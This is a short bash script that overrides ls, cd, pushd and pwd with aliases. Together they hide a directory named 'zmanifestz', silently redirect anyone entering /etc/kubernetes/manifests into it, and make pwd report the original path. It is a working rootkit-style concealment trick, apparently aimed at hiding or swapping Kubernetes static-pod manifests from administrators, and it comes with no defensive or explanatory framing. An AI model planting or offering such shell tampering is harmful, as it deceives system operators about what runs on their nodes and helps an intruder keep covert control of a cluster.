#aliases are the best

intercept_ls(){
    /usr/bin/ls $@ | awk '!/(zmanifestz)/{print}' | /usr/bin/cat
}
alias ls=intercept_ls

intercept_cd() {
    builtin cd $@
    CWD=$(builtin pwd)
    if [ "${CWD}" = "/etc/kubernetes/manifests" ]; 
    then
        builtin cd /etc/kubernetes/zmanifestz 
    fi
}
alias cd=intercept_cd

intercept_pushd() {
    builtin pushd $@ > /dev/null
    CWD=$(builtin pwd)
    if [ "${CWD}" = "/etc/kubernetes/manifests" ]; 
    then
        builtin cd /etc/kubernetes/zmanifestz 
    fi
}
alias pushd=intercept_pushd

intercept_pwd(){
    CWD=$(builtin pwd)
    if [ "${CWD}" = "/etc/kubernetes/zmanifestz" ]; 
    then
        echo "/etc/kubernetes/manifests"
    else
        echo $CWD
    fi
}
alias pwd=intercept_pwd
